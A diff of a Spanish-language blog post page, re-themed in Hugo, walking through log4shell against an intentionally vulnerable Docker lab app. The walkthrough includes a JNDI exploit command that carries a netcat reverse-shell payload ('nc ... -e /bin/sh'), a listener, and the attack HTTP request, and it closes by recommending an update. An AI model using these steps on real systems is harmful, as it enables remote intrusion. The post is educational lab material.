@@ -1,143 +1,259 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  
-    <title>Acerca de log4shell :: pacodiazdg.github.io</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.
-Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app
-git clone https://github." />
-<meta name="keywords" content="" />
+<html lang="es-es" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande. Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app git clone https://github.">
+<title>Acerca de log4shell</title>
 
-  <meta name="robots" content="noodp" />
+<link rel='canonical' href='http://10.10.8.69:1313/posts/acerca-de-log4shell/'>
 
-<link rel="canonical" href="https://pacodiazdg.github.io/posts/acerca-de-log4shell/" />
-
-
-  
-
-
-
-
-
-
-
-  
-  
-  
-  
-  
-  <link rel="stylesheet" href="https://pacodiazdg.github.io/styles.css">
-
-
-
-
-
-
-
-  <link rel="shortcut icon" href="https://pacodiazdg.github.io/img/theme-colors/red.png">
-  <link rel="apple-touch-icon" href="https://pacodiazdg.github.io/img/theme-colors/red.png">
-
-
-
-<meta name="twitter:card" content="summary" />
-
-
-
-<meta property="og:locale" content="en" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Acerca de log4shell">
-<meta property="og:description" content="log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.
-Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app
-git clone https://github." />
-<meta property="og:url" content="https://pacodiazdg.github.io/posts/acerca-de-log4shell/" />
-<meta property="og:site_name" content="pacodiazdg.github.io" />
-
-  
-    <meta property="og:image" content="https://pacodiazdg.github.io/img/favicon/red.png">
-  
-
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="627">
-
-
-  <meta property="article:published_time" content="2025-06-07 10:30:00 -0600 -0600" />
-
-
-
-
-
-
-
-
-
-
-
-
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Acerca de log4shell">
+<meta property='og:description' content="log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande. Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app git clone https://github.">
+<meta property='og:url' content='http://10.10.8.69:1313/posts/acerca-de-log4shell/'>
+<meta property='og:site_name' content='pacodiazdg.github.io'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='Java' /><meta property='article:tag' content='Backend' /><meta property='article:published_time' content='2025-06-07T10:30:00-06:00'/><meta property='article:modified_time' content='2025-06-07T10:30:00-06:00'/><meta property='og:image' content='http://10.10.8.69:1313/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png' />
+<meta name="twitter:title" content="Acerca de log4shell">
+<meta name="twitter:description" content="log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande. Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app git clone https://github."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://10.10.8.69:1313/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
 
   
 
-</head>
-<body class="red">
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://avatars.githubusercontent.com/u/26071783?v=4" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">🗿</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">pacodiazdg.github.io</a></h1>
+            <h2 class="site-description">Blog de programación, electrónica y GNU/Linux.</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Inicio</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/posts/' >
+                
+                
+                
+                <span>Blog</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://github.com/PacodiazDG' >
+                
+                
+                
+                <span>Github</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://www.linkedin.com/in/francisco-javier-d-a463901a2/' >
+                
+                
+                
+                <span>Linkedin</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
 
 
 
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
 
-<div class="container center headings--one-size">
 
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="/">
-  <div class="logo">
-    PacodiazDG
-  </div>
-</a>
 
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/posts/acerca-de-log4shell/">
+                
+                    <img src="/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png" loading="lazy" alt="Featured image of post Acerca de log4shell" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/linux/" >
+                Linux
+            </a>
+        
+            <a href="/categories/java/" >
+                Java
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/acerca-de-log4shell/">Acerca de log4shell</a>
+        </h2>
+    
+        
     </div>
+
     
     
-  </div>
-  
-</header>
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">7 June 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
 
 
-  <div class="content">
+
+                <time class="article-time--reading">
+                    2 minute read
+                </time>
+            </div>
+        
+    </footer>
     
-<article class="post">
-  <h1 class="post-title">
-    <a href="https://pacodiazdg.github.io/posts/acerca-de-log4shell/">Acerca de log4shell</a>
-  </h1>
-  <div class="post-meta"><time class="post-date">2025-06-07</time>
+
     
 </div>
 
-  
-    <span class="post-tags">
-      
-      #<a href="https://pacodiazdg.github.io/tags/java/">Java</a>&nbsp;
-      
-      #<a href="https://pacodiazdg.github.io/tags/backend/">Backend</a>&nbsp;
-      
-    </span>
-  
-  
+</header>
 
-
-
-  
-
-  <div class="post-content"><div>
-        <p>log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j  se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.</p>
-<h3 id="como-funciona">Como Funciona?<a href="#como-funciona" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable <a href="https://github.com/christophetd/log4shell-vulnerable-app">https://github.com/christophetd/log4shell-vulnerable-app</a></p>
+    <section class="article-content">
+    
+    
+    <p>log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j  se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.</p>
+<h3 id="como-funciona">Como Funciona?
+</h3><p>Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable <a class="link" href="https://github.com/christophetd/log4shell-vulnerable-app"  target="_blank" rel="noopener"
+    >https://github.com/christophetd/log4shell-vulnerable-app</a></p>
 <pre tabindex="0"><code>git clone https://github.com/christophetd/log4shell-vulnerable-app.git
 docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vulnerable-app
-</code></pre><p><img alt="Name" src="/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png"></p>
+</code></pre><p><img src="/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="Name"
+	
+	
+></p>
 <p>una vez descargado vamos analizar el código para ver en qué forma puede ser vulnerable</p>
-<p><img alt="Name" src="/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png"></p>
+<p><img src="/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="Name"
+	
+	
+></p>
 <p>La parte que nos interesa es:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#a6e22e">@GetMapping</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">index</span>(<span style="color:#a6e22e">@RequestHeader</span>(<span style="color:#e6db74">&#34;X-Api-Version&#34;</span>) String apiVersion) {
@@ -147,10 +263,20 @@ docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vu
 </span></span></code></pre></div><p>Y en especial esta ya que es la parte vulnerable :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>logger.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Received a request for API version &#34;</span> <span style="color:#f92672">+</span> apiVersion);
-</span></span></code></pre></div><p>después vamos a necesitar un servidor LDAP que nos permita ejecutar los comandos  <a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+</span></span></code></pre></div><p>después vamos a necesitar un servidor LDAP que nos permita ejecutar los comandos  <a class="link" href="https://github.com/welk1n/JNDI-Injection-Exploit"  target="_blank" rel="noopener"
+    >https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
 <pre tabindex="0"><code>java -jar JNDI-Injection-1.0-SNAPSHOT-all.jar -C &#34;nc 172.17.0.1 4444 -e /bin/sh&#34; 
 nc -lvp 4444
-</code></pre><p><img alt="Name" src="/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png"></p>
+</code></pre><p><img src="/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="Name"
+	
+	
+></p>
 <p>Solo hacemos un http request con el header X-Api-Version y con la dirección que nos proporcionó JNDI Injection</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
 </span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">192.168.1.141:8081</span>
@@ -160,50 +286,167 @@ nc -lvp 4444
 </span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
 </span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
 </span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-</span></span></code></pre></div><p><img alt="Name" src="/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png"></p>
-<p><img alt="Name" src="/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png"></p>
+</span></span></code></pre></div><p><img src="/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="Name"
+	
+	
+></p>
+<p><img src="/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="Name"
+	
+	
+></p>
 <p>debido a que la vulnerabilidad ya se encuentra arreglada en las nuevas versiones de Log4j  solo queda actualizar</p>
 
-      </div></div>
+</section>
 
-  
 
-  
+    <footer class="article-footer">
     
+    <section class="article-tags">
+        
+            <a href="/tags/java/">Java</a>
+        
+            <a href="/tags/backend/">Backend</a>
+        
+    </section>
 
-  
+
+    </footer>
+
+
+    
 </article>
 
-  </div>
+    
 
-  
-    <footer class="footer">
-  <div class="footer__inner">
     
-      <div class="copyright">
-        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+
+     
     
-      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
-      </div>
-  </div>
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 pacodiazdg.github.io
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
 </footer>
 
 
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
 
+    
+    <div class="pswp__bg"></div>
 
+    
+    <div class="pswp__scroll-wrap">
 
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
 
-<script type="text/javascript" src="/bundle.min.js"></script>
+        
+        <div class="pswp__ui pswp__ui--hidden">
 
+            <div class="pswp__top-bar">
 
+                
 
+                <div class="pswp__counter"></div>
 
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
 
+                <button class="pswp__button pswp__button--share" title="Share"></button>
 
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
 
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
 
-  
-</div>
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
 
-</body>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9a18bc510f28fc74544dcf12d90b1d46ba17f36f1ae169ef38bf0f9f3c140f15.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
 </html>
